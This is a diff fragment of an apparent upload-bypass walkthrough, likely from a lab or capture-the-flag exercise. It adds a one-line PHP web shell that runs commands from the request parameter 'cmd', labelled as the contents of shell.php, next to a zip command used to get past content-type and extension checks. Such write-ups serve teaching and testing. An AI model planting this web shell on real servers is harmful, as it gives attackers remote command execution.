@@ -190,6 +190,12 @@ After uploading i get a 400 error, this is likely because its detecting the file
 But by uploading a .zip it bypasses content-type and extension checks
 
 ```python
+<?php system($_REQUEST["cmd"]);?>
+```
+
+This is the contents of shell.php
+
+```python
 ❯❯❯ zip -r default.zip default.pdf                                                   
   adding: default.pdf (deflated 51%)
   
